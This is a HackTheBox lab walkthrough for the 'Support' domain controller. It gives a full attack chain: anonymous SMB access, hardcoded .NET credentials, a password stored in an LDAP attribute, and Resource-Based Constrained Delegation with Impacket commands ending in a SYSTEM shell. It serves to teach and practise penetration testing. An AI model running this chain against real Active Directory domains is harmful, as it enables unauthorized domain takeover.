# Support - HackTheBox

Windows Server 2022 domain controller for the `support.htb` domain. The path starts
with an SMB share leaking a custom .NET tool, recovers a hidden LDAP attribute to get
a domain user, then abuses Resource-Based Constrained Delegation (RBCD) entirely from
Kali with Impacket to impersonate the Administrator and land a SYSTEM shell on the DC.

Target: `dc.support.htb` (`support.htb` domain)

---

## Objectives

- Enumerate a domain controller without initial credentials
- Recover a service account from an exposed tool, then a domain user from LDAP
- Abuse RBCD to impersonate a privileged account
- Obtain SYSTEM on the domain controller and capture the root flag

---

## Reconnaissance

```bash
nmap -sC -sV dc.support.htb
```

Standard domain controller exposure. The services that matter for this path:

- Kerberos (88) - the domain KDC, used later for the S4U exchange
- LDAP (389) - bind as a service account, read directory attributes
- SMB (445) - signing enabled, anonymous (null) auth allowed
- WinRM (5985) - remote login for the `support` user, not for `ldap`

---

## Enumeration

### SMB Shares

Anonymous SMB access lists a non-default share:

```bash
smbclient -L //dc.support.htb/ -N
smbclient //dc.support.htb/support-tools -N
```

The `support-tools` share holds `UserInfo.exe.zip`. Download and extract it:

```bash
get UserInfo.exe.zip
```

### Recovering the ldap Service Account

`UserInfo.exe` is a .NET binary. Decompiling it (dnSpy / ILSpy) exposes hardcoded LDAP
credentials: the service account `ldap` with a password obfuscated by base64 plus a XOR
key embedded in the binary. Reversing the routine recovers the cleartext password.

This `ldap` account authenticates to LDAP and SMB but not to WinRM. Its only value is
reading directory attributes.

### LDAP - Recovering the support Password

The real password of the `support` user is hidden in the rarely-used `info` attribute
of its account object:

```bash
ldapsearch -x -H ldap://dc.support.htb -D 'ldap@support.htb' -w '<ldap_password>' \
  -b 'DC=support,DC=htb' '(samaccountname=support)' info
```

The `info` field returns the cleartext password:

```
support : Ironside47pleasure40Watchful
```

`support` can now log in over WinRM (evil-winrm) for the user flag. The root path below
does not need that shell - it runs entirely from Kali.

---

## Exploitation - Resource-Based Constrained Delegation

The whole chain hinges on two distinct identities doing two distinct jobs:

```
ldap enum  ->  recover support password from the info attribute
            ->  create a machine account (any user can)
            ->  write RBCD delegation on the DC  (requires support, not ldap)
            ->  S4U2Self + S4U2Proxy             (machine account requests the ticket)
            ->  Administrator ticket  ->  SYSTEM shell on the DC
```

### 1. Create a Machine Account

`ms-DS-MachineAccountQuota` is 10 by default, so any domain account can create up to ten
computer accounts. The `ldap` account is enough for this step:

```bash
impacket-addcomputer -computer-name 'FAKE-COMP02$' -computer-pass 'Password123' \
  -dc-ip 10.129.19.99 'support.htb/ldap:<ldap_password>'
```

Result: `Successfully added machine account FAKE-COMP02$`.

### 2. Write the RBCD Delegation (requires support, not ldap)

This is where the two identities matter. Writing `msDS-AllowedToActOnBehalfOfOtherIdentity`
on the `DC$` object needs an account with write rights over it. `ldap` does not have them
and returns `INSUFF_ACCESS_RIGHTS`. `support` is a member of `Shared Support Accounts`,
which holds `GenericAll` over `DC$`, so it can write the delegation:

```bash
impacket-rbcd -delegate-from 'FAKE-COMP02$' -delegate-to 'DC$' -action write \
  -dc-ip 10.129.19.99 'support.htb/support:Ironside47pleasure40Watchful'
```

Confirm with `-action read`: `FAKE-COMP02$` appears in the list of delegates allowed to
act on behalf of `DC$`.

### 3. S4U Attack

`getST` runs S4U2Self and S4U2Proxy internally and writes the `.ccache` directly. Passing
the machine account cleartext password avoids manual RC4/NT hash and `.kirbi` conversion:

```bash
impacket-getST -spn 'cifs/dc.support.htb' -impersonate Administrator \
  -dc-ip 10.129.19.99 'support.htb/FAKE-COMP02$:Password123'
```

Result: `Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache`.

### 4. SYSTEM Shell via Kerberos

Point Kerberos at the ticket and authenticate with PsExec, no password:

```bash
export KRB5CCNAME='Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache'
impacket-psexec -k -no-pass support.htb/Administrator@dc.support.htb
```

This drops a shell as `NT AUTHORITY\SYSTEM` on the domain controller.

---

## Why Impacket Instead of Rubeus

The official walkthrough runs the attack on-target inside the `support` WinRM session:
Powermad to create the machine account, `Set-ADComputer` to write the delegation, Rubeus
for S4U. That works, but it depends on three fragile things: binaries uploaded and intact
on the target, reliable execution inside Evil-WinRM, and a live WinRM session.

All three broke during this lab:

- Rubeus.exe was corrupted on-target and invoked without `.\` (PowerShell does not include
  the working directory in `PATH`)
- Mimikatz 2.2.0 was missing the `kerberos::s4u2self` module - a dead end
- the WinRM session was tied to `support`, while `ldap` has no remote login at all

The Impacket-from-Kali path removes those dependencies entirely: the RBCD attack is only
LDAP writes and Kerberos requests, with no code execution on the target.

Trade-off: the Rubeus path exposes the individual `.kirbi` tickets and the step-by-step
S4U mechanics, which is more instructive for understanding the internals and for OSCP-style
contexts.

---

## Key Takeaways

- Two identities, two roles: `support` writes the delegation (it holds `GenericAll` over
  `DC$`), `FAKE-COMP02$` exploits it (it is the delegate that requests the ticket).
  Confusing them produces `INSUFF_ACCESS_RIGHTS`.
- RBCD needs no shell on the target. Everything runs from Kali over LDAP and Kerberos.
  A remote shell is only needed for on-target tools like Powermad or Rubeus.
- `getST` collapses S4U2Self, S4U2Proxy, and ccache conversion into one command - no RC4
  hash, no `.kirbi`, no base64, no `ticketConverter`.
- RBCD is a high-frequency lateral movement and privesc pattern in real AD assessments:
  wherever a low-privilege account holds `GenericWrite`/`GenericAll`/`WriteProperty` over a
  computer object and the machine account quota is above zero (default 10), access can be
  forged as any user toward that machine.
- Watch the machine account state: a stale or non-existent account triggers
  `KDC_ERR_C_PRINCIPAL_UNKNOWN` on `getST`. Creating a clean account resolves it.

---

## Disclaimer

This box was completed in the controlled, legal environment provided by HackTheBox.
All actions were performed strictly for educational purposes.
